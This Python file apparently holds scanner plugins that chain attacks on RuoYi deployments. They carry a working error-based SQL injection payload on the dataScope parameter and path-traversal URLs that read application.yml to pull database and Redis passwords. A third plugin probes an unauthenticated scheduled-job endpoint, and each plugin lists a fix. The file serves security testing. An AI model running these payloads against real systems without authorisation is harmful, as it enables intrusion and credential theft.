# 链 1 专用插件：SQL 注入 → 文件读取配置 → 定时任务 RCE
#
# 三个原子步骤：
#   1. SQLInjectExtractPlugin: SQL 注入提取数据库名（extra: db_name）
#   2. ConfigReadPlugin: 任意文件读取获取配置凭证（extra: db_password, redis_password）
#   3. JobRCEVerifyPlugin: 定时任务 RCE 接口验证（extra: job_id）
#
# 注意：这些插件是链专用的，不注册到主扫描引擎路由表。
#       链引擎通过 ctx.facts 共享上游数据（如 db_name）。
import re

from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.matcher import match_sql_error
from plugins.base import PluginBase


def _mask_secret(value: str) -> str:
    """凭证掩码：仅保留首 2 字符用于人工核对，其余以 * 替代（证据脱敏用）"""
    if not value:
        return "***"
    return value[:2] + "***"


class SQLInjectExtractPlugin(PluginBase):
    """SQL 注入提取数据库名（链 1 步骤 1）

    通过 /system/role/list 的 dataScope 参数报错注入，提取当前数据库名。
    成功时 extra.db_name 存储数据库名，供下游节点使用。
    """

    name = "SQL注入提取数据库名"
    severity = "high"
    category = "vuln"
    description = "通过 SQL 报错注入提取当前数据库名"
    fix = "对 dataScope 参数做白名单校验，使用参数化查询"

    def verify(self, target, session):
        """对 dataScope 参数发 extractvalue 报错注入，回显提取当前数据库名

        命中 XPATH 报错特征（~库名 分隔）即判 CONFIRMED，库名存入 extra.db_name
        供下游 ConfigReadPlugin 使用；网络异常返回 UNKNOWN。

        @param target: 扫描目标 URL
        @param session: HTTP 会话（含登录态与 cookie 处理）
        @return: ScanResult；CONFIRMED=注入成功，SAFE=未命中特征，UNKNOWN=网络异常
        """
        url = join_url(target, "/system/role/list")
        # 报错注入 payload：extractvalue 提取 database()
        params = {
            # 0x7e 即 ASCII '~'：用作报错回显分隔符，配合下方正则稳定截取库名
            "dataScope": "1 AND extractvalue(1, concat(0x7e, (SELECT database())))",
            "pageNum": "1",
            "pageSize": "10",
        }
        try:
            resp = session.get(url, params=params)
            text = resp.text
        except Exception as e:
            return ScanResult(kind="chain", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=f"网络异常: {e}")

        # 报错特征：XPATH syntax error: '~ry' 或类似
        match = re.search(r"XPATH syntax error: '~([^']+)'", text)
        if match:
            db_name = match.group(1)
            return ScanResult(
                kind="chain",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=f"SQL注入成功，数据库名: {db_name}",
                fix=self.fix,
                extra={"db_name": db_name, "vuln_type": "sql_inject_extract"},
            )
        # 备用特征：必须同时含 database() 字面量与 DBMS 专属报错令牌才判定 CONFIRMED。
        # 历史缺陷：仅要求 "database()" + "error" 子串，普通错误页/回显载荷同样满足，
        # 会把不可利用目标误报为注入成功（db_name=unknown）并触发整条链。
        if "database()" in text and match_sql_error(text):
            return ScanResult(
                kind="chain",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 database() 与数据库报错特征",
                fix=self.fix,
                extra={"db_name": "unknown", "vuln_type": "sql_inject_extract"},
            )
        return ScanResult(kind="chain", name=self.name, status=STATUS_SAFE, url=url, evidence="未检测到 SQL 注入")


class ConfigReadPlugin(PluginBase):
    """配置文件读取（链 1 步骤 2）

    通过任意文件读取接口读取 application.yml 配置文件，
    正则提取数据库密码和 Redis 密码。
    成功时 extra.db_password / extra.redis_password 存储凭证。
    """

    name = "配置文件读取"
    severity = "high"
    category = "vuln"
    description = "通过任意文件读取获取 application.yml 配置凭证"
    fix = "限制文件读取接口路径，禁止目录穿越，配置文件敏感信息加密存储"

    def verify(self, target, session):
        """通过任意文件读取接口下载 application.yml，提取 db/redis 密码

        逐个尝试穿越路径，响应含 YAML 专有 spring/datasource 配置节才视为配置文件；
        提取的密码存入 extra 供链 1 后续节点使用（证据仅保留掩码）；
        读取到文件即 CONFIRMED，全部路径网络异常返回 UNKNOWN。

        @param target: 扫描目标 URL
        @param session: HTTP 会话（含登录态与 cookie 处理）
        @return: ScanResult；CONFIRMED=读取到配置，SAFE=全部路径未命中，UNKNOWN=网络异常
        """
        # 读取 Ruoyi 配置文件（常见路径）
        config_paths = [
            # 多个路径对应不同部署层级（jar 解包/安装目录深度不同），依次尝试补足穿越层数
            "/profile/../../../../../../../ruoyi-admin/src/main/resources/application.yml",
            "/profile/../../../../../../../config/application.yml",
            "/profile/../../../../../../../application.yml",
        ]
        # 记录首次成功读到配置文件的 URL，供「读到文件但未提取到密码」时出证据
        read_url = ""
        # 是否至少有一个路径拿到了有效响应。全部请求网络异常时判 UNKNOWN（契约约束）
        got_response = False
        for path in config_paths:
            url = join_url(target, f"/common/download/resource?resource={path}")
            try:
                resp = session.get(url)
                text = resp.text or ""
            except Exception:
                continue
            got_response = True

            # 配置文件特征：要求 YAML 专有的 spring 配置节（行首缩进 + "spring:"/"datasource:" 键）。
            # 加固说明：原判据是泛用英文单词 "password"/"spring"，任意含这些词的
            # 普通页面（JS/错误页）都会命中，导致误报 CONFIRMED；现用行首键名锚定。
            if not re.search(r"(?m)^\s*(spring|datasource):", text):
                continue

            # 正则提取数据库密码：限定在 datasource 块内匹配。
            # 若依 application.yml 的 redis: 块常位于 datasource 之前，泛匹配
            # password: 会把 Redis 密码误取为 db_password 并传播给下游节点
            db_password = ""
            db_match = re.search(r"(?ms)^[ \t]*datasource:.*?^[ \t]*password:[ \t]*(\S+)", text)
            if not db_match:
                # 兼容无嵌套 datasource 的简写配置：退回 spring: 块内首个 password
                db_match = re.search(r"(?ms)^[ \t]*spring:.*?^[ \t]*password:[ \t]*(\S+)", text)
            if db_match:
                db_password = db_match.group(1)

            # 正则提取 Redis 密码
            redis_password = ""
            # 非贪婪+跨行匹配限定在 redis: 块内取密码，避免误匹配数据库密码
            redis_match = re.search(r"redis:.*?password:\s*(\S+)", text, re.DOTALL)
            if redis_match:
                redis_password = redis_match.group(1)

            if db_password or redis_password:
                # 证据中只保留掩码形式：明文凭证仅进 extra（供链内下游节点使用），
                # 避免 ScanResult 持久化到报告/日志时二次泄露敏感口令。
                evidence_parts = []
                if db_password:
                    evidence_parts.append(f"数据库密码: {_mask_secret(db_password)}")
                if redis_password:
                    evidence_parts.append(f"Redis密码: {_mask_secret(redis_password)}")
                return ScanResult(
                    kind="chain",
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence="; ".join(evidence_parts),
                    fix=self.fix,
                    extra={"db_password": db_password, "redis_password": redis_password, "vuln_type": "config_read"},
                )
            # 配置文件读取成功但未提取到密码：记录首个可读 URL，继续尝试更深的路径，
            # 不在此处提前 return（否则后续路径不再遍历，可能漏掉含密码的那份配置）
            if not read_url:
                read_url = url

        # 读到配置文件但全部路径都未提取到密码
        if read_url:
            return ScanResult(
                kind="chain",
                name=self.name,
                status=STATUS_CONFIRMED,
                severity=self.severity,
                url=read_url,
                evidence="读取到配置文件但未提取到密码",
                fix=self.fix,
                extra={"db_password": "", "redis_password": "", "vuln_type": "config_read"},
            )

        # 一次有效响应都没有 → 网络异常，判定为不可判定（UNKNOWN），不得判 SAFE
        if not got_response:
            return ScanResult(
                kind="chain",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=target,
                evidence="网络异常：所有路径请求失败，无法判定",
            )

        return ScanResult(kind="chain", name=self.name, status=STATUS_SAFE, url=target, evidence="未读取到配置文件")


class JobRCEVerifyPlugin(PluginBase):
    """定时任务 RCE 验证（链 1 步骤 3）

    验证 /monitor/job 接口是否存在未授权访问或可被利用的定时任务 RCE。
    本插件仅验证接口可达性和基本特征，不实际执行命令。
    """

    name = "定时任务RCE验证"
    severity = "high"
    category = "vuln"
    description = "验证定时任务接口未授权访问和 RCE 可能性"
    fix = "定时任务接口强制鉴权，禁止调用任意类方法，白名单限制可执行类"

    def verify(self, target, session):
        """验证定时任务接口未授权访问与 RCE 风险（仅探测，不实际执行命令）

        rows 含 jobId/invokeTarget 字段判定未授权（invokeTarget 存在时任 RCE 风险）；
        跳转登录页或 401/403 判定已鉴权（SAFE）。

        @param target: 扫描目标 URL
        @param session: HTTP 会话（含登录态与 cookie 处理）
        @return: ScanResult；CONFIRMED=未授权访问，SAFE=需鉴权或不可达，UNKNOWN=网络异常
        """
        # 检查 /monitor/job 接口是否可访问（未授权）
        url = join_url(target, "/monitor/job/list")
        try:
            resp = session.get(url, params={"pageNum": "1", "pageSize": "10"})
            text = resp.text
        except Exception as e:
            return ScanResult(kind="chain", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=f"网络异常: {e}")

        # 特征 1：返回 JSON 含 jobs 列表（未授权访问）
        if '"rows"' in text and ('"jobId"' in text or '"invokeTarget"' in text):
            # 特征 2：存在 invokeTarget 字段（可被利用为 RCE）
            if "invokeTarget" in text:
                return ScanResult(
                    kind="chain",
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence="定时任务接口未授权访问，含 invokeTarget 字段（RCE 风险）",
                    fix=self.fix,
                    extra={"job_endpoint": "/monitor/job", "vuln_type": "job_rce"},
                )
            # 仅未授权访问，无 RCE 特征
            return ScanResult(
                kind="chain",
                name=self.name,
                severity="medium",
                status=STATUS_CONFIRMED,
                url=url,
                evidence="定时任务接口未授权访问（无 invokeTarget）",
                fix=self.fix,
                extra={"job_endpoint": "/monitor/job", "vuln_type": "job_unauth"},
            )

        # 检查是否重定向到登录页（已鉴权）
        if "login" in text.lower() or resp.status_code in (302, 401, 403):
            return ScanResult(kind="chain", name=self.name, status=STATUS_SAFE, url=url, evidence="定时任务接口需鉴权")

        return ScanResult(
            kind="chain", name=self.name, status=STATUS_SAFE, url=url, evidence="定时任务接口不可达或无特征"
        )
